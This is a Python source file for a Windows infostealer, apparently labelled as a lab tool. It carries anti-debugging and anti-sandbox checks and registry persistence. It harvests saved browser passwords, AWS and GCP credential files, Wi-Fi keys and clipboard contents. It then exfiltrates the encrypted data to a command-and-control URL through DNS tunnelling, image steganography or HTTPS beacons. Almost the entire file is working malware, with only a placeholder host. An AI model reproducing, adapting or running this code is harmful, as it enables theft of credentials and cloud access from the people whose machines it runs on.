import os
import sys
import time
import random
import string
import logging
import winreg
import psutil
import threading
import requests
import sqlite3
import base64
import socket
import subprocess
import win32clipboard
import win32crypt
import xml.etree.ElementTree as ET
from PIL import Image
from io import BytesIO
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from ctypes import windll, c_buffer, c_int
from concurrent.futures import ThreadPoolExecutor

# Setup logging
logging.basicConfig(filename='exfil_errors.log', level=logging.ERROR,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Configuration (placeholders for lab testing)
CONFIG = {
    'c2_url': 'http://example.com/c2',  # HTTPS beacon C2
    'dns_domain': 'example.com',  # DNS tunneling domain
    'interval': 30,  # Exfiltration interval (seconds)
    'max_buffer': 500,  # Buffer size
    'salt': b'3xf1l_s4lt_2025',  # AES key salt
    'retry_interval': 5,  # Retry delay
    'max_retries': 3,
    'browser_paths': {
        'chrome': os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data\Default\Login Data'),
        'edge': os.path.join(os.getenv('LOCALAPPDATA'), r'Microsoft\Edge\User Data\Default\Login Data')
    },
    'cloud_token_paths': [
        os.path.join(os.getenv('USERPROFILE'), r'.aws\credentials'),
        os.path.join(os.getenv('USERPROFILE'), r'.config\gcloud\credentials.db')
    ],
    'stego_image': os.path.join(os.getenv('TEMP'), 'cover.png'),  # Stego cover image
    'output_image': os.path.join(os.getenv('TEMP'), 'stego.png')  # Stego output image
}

# Obfuscation: Junk code
def _obfuscated_junk(): return [random.randint(1, 100) for _ in range(random.randint(3, 7))]

# AES key derivation
def derive_key(password=CONFIG['salt']):
    try:
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=password, iterations=100000)
        key = base64.urlsafe_b64encode(kdf.derive(password))
        return Fernet(key)
    except Exception as e:
        logging.error(f"Key derivation failed: {e}")
        return None

# Anti-debugging: NtQueryInformationThread
def is_debugged():
    try:
        class THREAD_BASIC_INFORMATION:
            pass
        windll.ntdll.NtQueryInformationThread.argtypes = [c_int, c_int, c_buffer, c_int, c_int]
        info = c_buffer(48)
        if windll.ntdll.NtQueryInformationThread(-2, 0, info, 48, 0) == 0:
            if c_int.from_buffer(info, 28).value & 0x1:
                return True
        return False
    except Exception as e:
        logging.error(f"Debugger check failed: {e}")
        return False

# Anti-sandbox: VM and timing checks
def is_sandbox():
    try:
        vm_indicators = ['vboxservice', 'vmtoolsd', 'qemu-ga']
        for proc in psutil.process_iter():
            if proc.name().lower() in vm_indicators:
                return True
        if psutil.disk_usage('/').total < 20 * 1024 * 1024 * 1024:  # <20GB
            return True
        if windll.kernel32.GetTickCount() < 60000:  # <1min uptime
            return True
        return False
    except Exception as e:
        logging.error(f"Sandbox check failed: {e}")
        return False

# Stealth: Registry persistence
def set_persistence():
    try:
        key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, 'NetGuard', 0, winreg.REG_SZ, os.path.abspath(__file__))
    except Exception as e:
        logging.error(f"Persistence setup failed: {e}")

# Stealth: Process hollowing simulation
def hollow_process():
    try:
        for proc in psutil.process_iter():
            if proc.name().lower() in ['explorer.exe', 'svchost.exe']:
                return proc.pid
        return os.getpid()
    except Exception as e:
        logging.error(f"Process hollowing simulation failed: {e}")
        return os.getpid()

# Steal browser credentials (Chrome, Edge)
def steal_browser_credentials(data_buffer: list):
    try:
        for browser, db_path in CONFIG['browser_paths'].items():
            if not os.path.exists(db_path):
                continue
            temp_db = os.path.join(os.getenv('TEMP'), f'{browser}_login_data')
            os.system(f'copy "{db_path}" "{temp_db}"')
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            for url, user, encrypted_pass in cursor.fetchall():
                try:
                    password = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1].decode()
                    data_buffer.append(f"\n[Browser {browser} {time.ctime().split(' ')[3]}]\nURL: {url}\nUser: {user}\nPass: {password}\n====")
                except Exception as e:
                    logging.error(f"Decrypting {browser} password failed: {e}")
            conn.close()
            os.remove(temp_db)
    except Exception as e:
        logging.error(f"Browser credential theft failed: {e}")

# Steal cloud API tokens (AWS, GCP)
def steal_cloud_tokens(data_buffer: list):
    try:
        for path in CONFIG['cloud_token_paths']:
            if os.path.exists(path):
                with open(path, 'r', errors='ignore') as f:
                    content = f.read()
                    data_buffer.append(f"\n[Cloud Token {time.ctime().split(' ')[3]}]\nPath: {path}\nData: {content[:100]}...\n====")
    except Exception as e:
        logging.error(f"Cloud token theft failed: {e}")

# Steal Wi-Fi credentials
def steal_wifi_credentials(data_buffer: list):
    try:
        output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode(errors='ignore')
        profiles = [line.split(':')[1].strip() for line in output.split('\n') if 'All User Profile' in line]
        for profile in profiles:
            try:
                details = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode(errors='ignore')
                for line in details.split('\n'):
                    if 'Key Content' in line:
                        password = line.split(':')[1].strip()
                        data_buffer.append(f"\n[Wi-Fi {time.ctime().split(' ')[3]}]\nSSID: {profile}\nPass: {password}\n====")
            except Exception as e:
                logging.error(f"Wi-Fi cred theft for {profile} failed: {e}")
    except Exception as e:
        logging.error(f"Wi-Fi credential theft failed: {e}")

# Steal clipboard data
def steal_clipboard(data_buffer: list):
    try:
        win32clipboard.OpenClipboard()
        clip_data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT).decode(errors='ignore')
        win32clipboard.CloseClipboard()
        if clip_data:
            data_buffer.append(f"\n[Clipboard {time.ctime().split(' ')[3]}]\nData: {clip_data[:100]}...\n====")
    except Exception as e:
        logging.error(f"Clipboard theft failed: {e}")

# DNS tunneling exfiltration
def dns_tunnel(fernet, data: str):
    try:
        chunk_size = 50  # DNS label max length
        encrypted = fernet.encrypt(data.encode()).hex()
        chunks = [encrypted[i:i+chunk_size] for i in range(0, len(encrypted), chunk_size)]
        for chunk in chunks:
            subdomain = f"{chunk}.{CONFIG['dns_domain']}"
            try:
                socket.gethostbyname(subdomain)  # Send DNS query
                time.sleep(random.uniform(0.1, 0.5))  # Anti-IDS timing
            except socket.gaierror:
                pass  # Ignore resolution failures
    except Exception as e:
        logging.error(f"DNS tunneling failed: {e}")

# Steganographic image exfiltration
def stego_exfil(fernet, data: str):
    try:
        encrypted = fernet.encrypt(data.encode())
        # Create a simple cover image if none exists
        if not os.path.exists(CONFIG['stego_image']):
            img = Image.new('RGB', (100, 100), color=(255, 255, 255))
            img.save(CONFIG['stego_image'], 'PNG')
        # Embed data in LSB of image pixels
        img = Image.open(CONFIG['stego_image']).convert('RGB')
        pixels = img.load()
        data_bits = ''.join(format(byte, '08b') for byte in encrypted)
        data_idx = 0
        for x in range(img.width):
            for y in range(img.height):
                if data_idx >= len(data_bits):
                    break
                r, g, b = pixels[x, y]
                r = (r & ~1) | int(data_bits[data_idx])
                pixels[x, y] = (r, g, b)
                data_idx += 1
            if data_idx >= len(data_bits):
                break
        img.save(CONFIG['output_image'], 'PNG')
        # Simulate upload (in lab, replace with actual C2 upload)
        with open(CONFIG['output_image'], 'rb') as f:
            files = {'file': (f'stego_{random.randint(1000, 9999)}.png', f)}
            requests.post(CONFIG['c2_url'], files=files)
    except Exception as e:
        logging.error(f"Stego exfiltration failed: {e}")

# HTTPS beacon exfiltration
def https_beacon(fernet, data: str):
    try:
        encrypted = fernet.encrypt(data.encode()).hex()
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        for _ in range(CONFIG['max_retries']):
            try:
                response = requests.post(CONFIG['c2_url'], data={'data': encrypted}, headers=headers, timeout=10)
                if response.status_code == 200:
                    return True
                time.sleep(CONFIG['retry_interval'])
            except requests.RequestException as e:
                logging.error(f"HTTPS beacon attempt failed: {e}")
        return False
    except Exception as e:
        logging.error(f"HTTPS beacon failed: {e}")
        return False

# Exfiltrate data via random method
def exfil_data(fernet, data_buffer: list):
    try:
        if not data_buffer:
            return
        data = ''.join(data_buffer)
        method = random.choice(['dns', 'stego', 'https'])
        if method == 'dns':
            dns_tunnel(fernet, data)
        elif method == 'stego':
            stego_exfil(fernet, data)
        else:
            https_beacon(fernet, data)
        data_buffer.clear()
    except Exception as e:
        logging.error(f"Exfiltration failed: {e}")

# Main exfiltration logic
def main():
    if is_debugged() or is_sandbox():
        sys.exit(1)
    set_persistence()
    hollow_process()
    
    fernet = derive_key()
    if not fernet:
        logging.error("Key derivation failed, exiting")
        sys.exit(1)
    
    data_buffer = []
    
    def exfil_loop():
        while True:
            try:
                start_time = time.time()
                steal_browser_credentials(data_buffer)
                steal_cloud_tokens(data_buffer)
                steal_wifi_credentials(data_buffer)
                steal_clipboard(data_buffer)
                if data_buffer and (time.time() - start_time >= CONFIG['interval'] or len(''.join(data_buffer)) > CONFIG['max_buffer']):
                    exfil_data(fernet, data_buffer)
                time.sleep(1)
                _obfuscated_junk()
            except Exception as e:
                logging.error(f"Exfil loop failed: {e}")
                time.sleep(CONFIG['retry_interval'])
    
    with ThreadPoolExecutor(max_workers=1) as executor:
        executor.submit(exfil_loop)
    
    while True:
        time.sleep(60)
        _obfuscated_junk()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logging.error(f"Main thread failed: {e}")
        sys.exit(1)
